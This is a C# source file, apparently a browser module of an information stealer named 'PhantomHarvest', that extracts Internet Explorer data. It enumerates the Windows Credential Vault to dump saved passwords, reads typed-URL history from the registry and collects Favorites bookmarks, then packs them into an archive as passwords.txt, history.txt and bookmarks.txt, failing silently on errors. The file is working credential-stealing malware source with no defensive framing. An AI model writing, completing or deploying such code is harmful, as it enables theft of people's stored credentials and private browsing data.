using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Browsers
{
	public static class IE
	{
		[DllImport("kernel32", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

		[DllImport("kernel32")]
		public static extern IntPtr GetCurrentProcess();

		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string history = IE.IE_history();
				if (!string.IsNullOrEmpty(history))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(history)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, IE.BrowserName + "/history.txt", ms, DateTime.Now, "");
					}
				}
				
				string books = IE.IE_books();
				if (!string.IsNullOrEmpty(books))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(books)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, IE.BrowserName + "/bookmarks.txt", ms, DateTime.Now, "");
					}
				}
				
				string passwords = IE.IE_passwords();
				if (!string.IsNullOrEmpty(passwords))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(passwords)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, IE.BrowserName + "/passwords.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string IE_passwords()
		{
			if (IntPtr.Size == 4)
			{
				bool flag;
				IE.IsWow64Process(IE.GetCurrentProcess(), out flag);
				if (flag)
				{
					return "Don't support recovery IE password from wow64 process";
				}
			}
			StringBuilder stringBuilder = new StringBuilder();
			Version version = Environment.OSVersion.Version;
			int major = version.Major;
			int minor = version.Minor;
			Type typeFromHandle;
			if (major >= 6 && minor >= 2)
			{
				typeFromHandle = typeof(Win32Api.VAULT_ITEM_WIN8);
			}
			else
			{
				typeFromHandle = typeof(Win32Api.VAULT_ITEM_WIN7);
			}
			int num = 0;
			IntPtr zero = IntPtr.Zero;
			int num2 = Win32Api.VaultEnumerateVaults(0, ref num, ref zero);
			if (num2 != 0)
			{
				return ""; // Silent fail
			}
			IntPtr ptr = zero;
			Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>
			{
				{
					new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"),
					"Windows Secure Note"
				},
				{
					new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"),
					"Windows Web Password Credential"
				},
				{
					new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"),
					"Windows Credential Picker Protector"
				},
				{
					new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"),
					"Web Credentials"
				},
				{
					new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"),
					"Windows Credentials"
				},
				{
					new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"),
					"Windows Domain Certificate Credential"
				},
				{
					new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"),
					"Windows Domain Password Credential"
				},
				{
					new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"),
					"Windows Extended Credential"
				},
				{
					new Guid("00000000-0000-0000-0000-000000000000"),
					null
				}
			};
			for (int i = 0; i < num; i++)
			{
				object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
				Guid key = new Guid(obj.ToString());
				ptr = (IntPtr)(ptr.ToInt64() + (long)Marshal.SizeOf(typeof(Guid)));
				IntPtr zero2 = IntPtr.Zero;
				string str = dictionary.ContainsKey(key) ? dictionary[key] : key.ToString();
				num2 = Win32Api.VaultOpenVault(ref key, 0U, ref zero2);
				if (num2 != 0)
				{
					continue;
				}
				int num3 = 0;
				IntPtr zero3 = IntPtr.Zero;
				num2 = Win32Api.VaultEnumerateItems(zero2, 512, ref num3, ref zero3);
				if (num2 != 0)
				{
					continue;
				}
				IntPtr ptr2 = zero3;
				if (num3 > 0)
				{
					for (int j = 1; j <= num3; j++)
					{
						object obj2 = Marshal.PtrToStructure(ptr2, typeFromHandle);
						ptr2 = (IntPtr)(ptr2.ToInt64() + (long)Marshal.SizeOf(typeFromHandle));
						IntPtr zero4 = IntPtr.Zero;
						FieldInfo field = obj2.GetType().GetField("SchemaId");
						Guid guid = new Guid(field.GetValue(obj2).ToString());
						IntPtr intPtr = (IntPtr)obj2.GetType().GetField("pResourceElement").GetValue(obj2);
						IntPtr intPtr2 = (IntPtr)obj2.GetType().GetField("pIdentityElement").GetValue(obj2);
						ulong fileTime = (ulong)obj2.GetType().GetField("LastModified").GetValue(obj2);
						IntPtr intPtr3 = IntPtr.Zero;
						if (major >= 6 && minor >= 2)
						{
							intPtr3 = (IntPtr)obj2.GetType().GetField("pPackageSid").GetValue(obj2);
							num2 = Win32Api.VaultGetItem_WIN8(zero2, ref guid, intPtr, intPtr2, intPtr3, IntPtr.Zero, 0, ref zero4);
						}
						else
						{
							num2 = Win32Api.VaultGetItem_WIN7(zero2, ref guid, intPtr, intPtr2, IntPtr.Zero, 0, ref zero4);
						}
						if (num2 != 0)
						{
							continue;
						}
						object obj3 = Marshal.PtrToStructure(zero4, typeFromHandle);
						object obj4 = IE.GetVaultElementValue((IntPtr)obj3.GetType().GetField("pAuthenticatorElement").GetValue(obj3));
						object obj5 = null;
						if (intPtr3 != IntPtr.Zero)
						{
							obj5 = IE.GetVaultElementValue(intPtr3);
						}
						if (obj4 != null)
						{
							stringBuilder.AppendLine("Vault Type   : {" + str + "}");
							object obj6 = IE.GetVaultElementValue(intPtr);
							if (obj6 != null)
							{
								stringBuilder.AppendLine("Vault Type   : {" + ((obj6 != null) ? obj6.ToString() : null) + "}");
							}
							object obj7 = IE.GetVaultElementValue(intPtr2);
							if (obj7 != null)
							{
								stringBuilder.AppendLine("Vault Type   : {" + ((obj7 != null) ? obj7.ToString() : null) + "}");
							}
							if (obj5 != null)
							{
								stringBuilder.AppendLine("Vault Type   : {" + ((obj5 != null) ? obj5.ToString() : null) + "}");
							}
							stringBuilder.AppendLine("Vault Type   : {" + ((obj4 != null) ? obj4.ToString() : null) + "}");
							stringBuilder.AppendLine("LastModified : {" + DateTime.FromFileTimeUtc((long)fileTime).ToString() + "}");
							stringBuilder.AppendLine();
						}
					}
				}
			}
			return stringBuilder.ToString();
		}

		public static string IE_history()
		{
			StringBuilder stringBuilder = new StringBuilder();
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\TypedURLs");
			if (registryKey == null) return "";
			
			string[] array = new string[26];
			for (int i = 1; i < 26; i++)
			{
				try
				{
					string[] array2 = array;
					int num = i;
					object value = registryKey.GetValue("url" + i.ToString());
					array2[num] = ((value != null) ? value.ToString() : null);
				}
				catch
				{
				}
			}
			foreach (string text in array)
			{
				if (text != null)
				{
					stringBuilder.AppendLine(text);
				}
			}
			return stringBuilder.ToString();
		}

		public static string IE_books()
		{
			StringBuilder stringBuilder = new StringBuilder();
			try 
			{
				foreach (string text in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Favorites), "*.url", SearchOption.AllDirectories))
				{
					if (File.Exists(text))
					{
						Match match = Regex.Match(File.ReadAllText(text), "URL=(.*?)\\n");
						stringBuilder.AppendLine(text ?? "");
						stringBuilder.AppendLine("\t" + match.Value);
					}
				}
			}
			catch {}
			return stringBuilder.ToString();
		}

		[CompilerGenerated]
		internal static object GetVaultElementValue(IntPtr vaultElementPtr)
		{
			object obj = Marshal.PtrToStructure(vaultElementPtr, typeof(Win32Api.VAULT_ITEM_ELEMENT));
			object value = obj.GetType().GetField("Type").GetValue(obj);
			IntPtr ptr = (IntPtr)(vaultElementPtr.ToInt64() + 16L);
			switch ((int)value)
			{
			case 0:
			{
				object obj2 = Marshal.ReadByte(ptr);
				return (bool)obj2;
			}
			case 1:
				return Marshal.ReadInt16(ptr);
			case 2:
				return Marshal.ReadInt16(ptr);
			case 3:
				return Marshal.ReadInt32(ptr);
			case 4:
				return Marshal.ReadInt32(ptr);
			case 5:
				return Marshal.PtrToStructure(ptr, typeof(double));
			case 6:
				return Marshal.PtrToStructure(ptr, typeof(Guid));
			case 7:
				return Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptr));
			case 12:
				return new SecurityIdentifier(Marshal.ReadIntPtr(ptr)).Value;
			}
			return null;
		}

		public static string BrowserName = "IE";
	}
}
